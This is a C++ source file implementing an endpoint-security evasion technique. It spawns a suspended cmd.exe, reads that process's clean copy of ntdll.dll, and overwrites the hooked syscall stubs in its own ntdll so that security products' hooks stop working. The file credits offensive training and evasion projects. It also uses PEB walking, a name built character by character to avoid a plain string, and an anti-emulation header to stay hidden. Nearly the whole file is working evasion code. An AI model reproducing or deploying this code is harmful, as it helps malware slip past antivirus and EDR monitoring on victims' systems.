/*
** tributes to 
** https://institute.sektor7.net/
** https://dosxuz.gitlab.io/post/perunsfart/
I rename it to god's speed for its original meaning

*/
#include <windows.h>
#include <stdio.h>
#include <iostream>
// #include "helper.h"
#include "anti_emu.h"
#include <stdlib.h>
#include <string.h>

///Define prototypes: 

typedef BOOL(WINAPI *CreateProcessA_t) (
    LPCSTR                lpApplicationName,
	LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCSTR                lpCurrentDirectory,
	LPSTARTUPINFOA        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef NTSTATUS(WINAPI *NtReadVirtualMemory_t)(
	HANDLE               ProcessHandle,
	PVOID                BaseAddress,
	PVOID               Buffer,
	ULONG                NumberOfBytesToRead,
	PULONG              NumberOfBytesReaded
	);

////////////////////////



typedef struct _UNICODE_STR
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

typedef struct _PEB_LDR_DATA
{
	DWORD dwLength;
	DWORD dwInitialized;
	LPVOID lpSsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

//redefine LDR_DATA_TABLE_ENTRY struct
typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STR FullDllName;
	UNICODE_STR BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

//redefine PEB_FREE_BLOCK struct
typedef struct _PEB_FREE_BLOCK
{
	struct _PEB_FREE_BLOCK* pNext;
	DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

//redefine PEB struct
typedef struct __PEB
{
	BYTE bInheritedAddressSpace;
	BYTE bReadImageFileExecOptions;
	BYTE bBeingDebugged;
	BYTE bSpareBool;
	LPVOID lpMutant;
	LPVOID lpImageBaseAddress;
	PPEB_LDR_DATA pLdr;
	LPVOID lpProcessParameters;
	LPVOID lpSubSystemData;
	LPVOID lpProcessHeap;
	PRTL_CRITICAL_SECTION pFastPebLock;
	LPVOID lpFastPebLockRoutine;
	LPVOID lpFastPebUnlockRoutine;
	DWORD dwEnvironmentUpdateCount;
	LPVOID lpKernelCallbackTable;
	DWORD dwSystemReserved;
	DWORD dwAtlThunkSListPtr32;
	PPEB_FREE_BLOCK pFreeList;
	DWORD dwTlsExpansionCounter;
	LPVOID lpTlsBitmap;
	DWORD dwTlsBitmapBits[2];
	LPVOID lpReadOnlySharedMemoryBase;
	LPVOID lpReadOnlySharedMemoryHeap;
	LPVOID lpReadOnlyStaticServerData;
	LPVOID lpAnsiCodePageData;
	LPVOID lpOemCodePageData;
	LPVOID lpUnicodeCaseTableData;
	DWORD dwNumberOfProcessors;
	DWORD dwNtGlobalFlag;
	LARGE_INTEGER liCriticalSectionTimeout;
	DWORD dwHeapSegmentReserve;
	DWORD dwHeapSegmentCommit;
	DWORD dwHeapDeCommitTotalFreeThreshold;
	DWORD dwHeapDeCommitFreeBlockThreshold;
	DWORD dwNumberOfHeaps;
	DWORD dwMaximumNumberOfHeaps;
	LPVOID lpProcessHeaps;
	LPVOID lpGdiSharedHandleTable;
	LPVOID lpProcessStarterHelper;
	DWORD dwGdiDCAttributeList;
	LPVOID lpLoaderLock;
	DWORD dwOSMajorVersion;
	DWORD dwOSMinorVersion;
	WORD wOSBuildNumber;
	WORD wOSCSDVersion;
	DWORD dwOSPlatformId;
	DWORD dwImageSubsystem;
	DWORD dwImageSubsystemMajorVersion;
	DWORD dwImageSubsystemMinorVersion;
	DWORD dwImageProcessAffinityMask;
	DWORD dwGdiHandleBuffer[34];
	LPVOID lpPostProcessInitRoutine;
	LPVOID lpTlsExpansionBitmap;
	DWORD dwTlsExpansionBitmapBits[32];
	DWORD dwSessionId;
	ULARGE_INTEGER liAppCompatFlags;
	ULARGE_INTEGER liAppCompatFlagsUser;
	LPVOID lppShimData;
	LPVOID lpAppCompatInfo;
	UNICODE_STR usCSDVersion;
	LPVOID lpActivationContextData;
	LPVOID lpProcessAssemblyStorageMap;
	LPVOID lpSystemDefaultActivationContextData;
	LPVOID lpSystemAssemblyStorageMap;
	DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)

//Reference -> https://github.com/paranoidninja/PIC-Get-Privileges/blob/main/addresshunter.h

PVOID GetDll(PWSTR FindName)
{
	_PPEB ppeb = (_PPEB)__readgsqword(0x60);
	ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
	ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
	PVOID dllBase = nullptr;

	ULONG_PTR val2;
	while (val1)
	{
		PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
		dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
		if (wcscmp(FindName, DllName) == 0)
		{
			break;
		}
		val1 = DEREF_64(val1);
	}
	return dllBase;
}

//Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c

BOOL GetImageExportDirectory(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
	//Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}
	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, CHAR* findfunction)
{
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNameOrdinals);
	PVOID funcAddress = 0x00;
	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (strcmp(findfunction, pczFunctionName) == 0)
		{
			WORD cw = 0;
			while (TRUE)
			{
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
				{
					return 0x00;
				}

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
				{
					return 0x00;
				}

				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					WORD syscall = (high << 8) | low;
					//printf("Function Name : %s", pczFunctionName);
					//printf("Syscall : 0x%x", syscall);
					return pFunctionAddress;
					break;
				}
				cw++;
			}
		}
	}
	return funcAddress;
}

DWORD ChangePerms(PVOID textBase, DWORD flProtect, SIZE_T size)
{
	DWORD oldprotect;
	VirtualProtect(textBase, size, flProtect, &oldprotect);
	return oldprotect;
}

void OverwriteNtdll(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
{
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);

    bool firstPrinted = false;
    WORD lastFunctionIndex = hooked_pImageExportDirectory->NumberOfNames - 1;

	for (WORD cx = 0; cx < hooked_pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (strstr(pczFunctionName, (CHAR*)"Nt") != NULL)
		{
			PVOID funcAddress = GetTableEntry(freshntDllBase, pImageExportDirectory, pczFunctionName);
			if (funcAddress != 0x00 && strcmp((CHAR*)"NtAccessCheck", pczFunctionName) != 0)
			{
				// only print the first and last function name and addresses:
                if (!firstPrinted || cx == lastFunctionIndex) {
                    printf("[+] Last function name: %s\n", pczFunctionName);
                    printf("[+] Last address of function in clean ntdll: 0x%p\n", funcAddress);
					firstPrinted = true;
				}

				// printf("[+] Function name : %s\n", pczFunctionName);
				// printf("[+] Address of function in clean ntdll : 0x%p\n", funcAddress);
				//Change the write permissions of the .text section of the ntdll in memory
				DWORD oldprotect = ChangePerms((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), PAGE_EXECUTE_WRITECOPY, textsection->Misc.VirtualSize);
				//Copy the syscall stub from the fresh ntdll.dll to the hooked ntdll
				memcpy((LPVOID)pFunctionAddress, (LPVOID)funcAddress, 23);
				//Change back to the old permissions
				ChangePerms((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), oldprotect, textsection->Misc.VirtualSize);
			}
		}
	}
	printf("[+] ntdll.dll cleaned in our process\n");
	// getchar();
}

void WriteDll(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER textsection)
{
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

	if (!GetImageExportDirectory(freshntDllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
	//print proper debug messages, not  printf("Error\n");:
		printf("[-] GetImageExportDirectory failed\n");

	PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(ntdllBase, &hooked_pImageExportDirectory) || hooked_pImageExportDirectory == NULL)
		printf("[-] GetImageExportDirectory failed\n");

	OverwriteNtdll(ntdllBase, freshntDllBase, hooked_pImageExportDirectory, pImageExportDirectory, textsection);
}

//////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////

CreateProcessA_t CreateProcessA_p = (CreateProcessA_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessA");
NtReadVirtualMemory_t NtReadVirtualMemory_p = (NtReadVirtualMemory_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtReadVirtualMemory");

// CreateProcessA_t CreateProcessA_p = (CreateProcessA_t)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateProcessA");
// NtReadVirtualMemory_t NtReadVirtualMemory_p = (NtReadVirtualMemory_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtReadVirtualMemory");

void ExecuteProcessOperations()
{
	//start process in a suspended state
	STARTUPINFOA* si = new STARTUPINFOA();
	PROCESS_INFORMATION* pi = new PROCESS_INFORMATION();
	BOOL stat = CreateProcessA_p(nullptr, (LPSTR)"cmd.exe", nullptr, nullptr, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, nullptr, "C:\\Windows\\System32\\", si, pi);

	HANDLE hProcess = pi->hProcess;
	printf("PID : %d\n", pi->dwProcessId);
	// getchar();

	// WCHAR findname[] = L"ntdll.dll\x00";
	WCHAR findname[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0 };
	PVOID ntdllBase = GetDll(findname);
	printf("[*] ntdll base address : 0x%p\n", ntdllBase);

	//Read the ntdll.dll from the remote suspended process
	PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS ImgNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + (ImgDosHeader->e_lfanew));
	IMAGE_OPTIONAL_HEADER OptHeader = (IMAGE_OPTIONAL_HEADER)ImgNTHeaders->OptionalHeader;
	PIMAGE_SECTION_HEADER textsection = IMAGE_FIRST_SECTION(ImgNTHeaders);

	DWORD ntdllSize = OptHeader.SizeOfImage;
	LPVOID freshNtdll = VirtualAlloc(NULL, ntdllSize, MEM_COMMIT, PAGE_READWRITE);
	DWORD bytesread = 0;
	printf("[*] clean ntdll : 0x%p\n", freshNtdll);
	NtReadVirtualMemory_p(hProcess, ntdllBase, freshNtdll, ntdllSize, &bytesread);

	// There is an alternative way. We maybe able to map the freshNtdll into heap
	// and read our syscalls from there rather than stored into a private Mem as y VirtualAlloc
	// But this is for another day! 
	//Overwrite the original ntdll.dll with the ntdll.dll read from suspended process

	WriteDll(ntdllBase, freshNtdll, textsection);
	printf("Terminating suspended process \n");
	TerminateProcess(hProcess, 0);
	printf("Mission completed\n");
	// getchar();
}

int main()
{

	ExecuteProcessOperations();
	return 0;
}
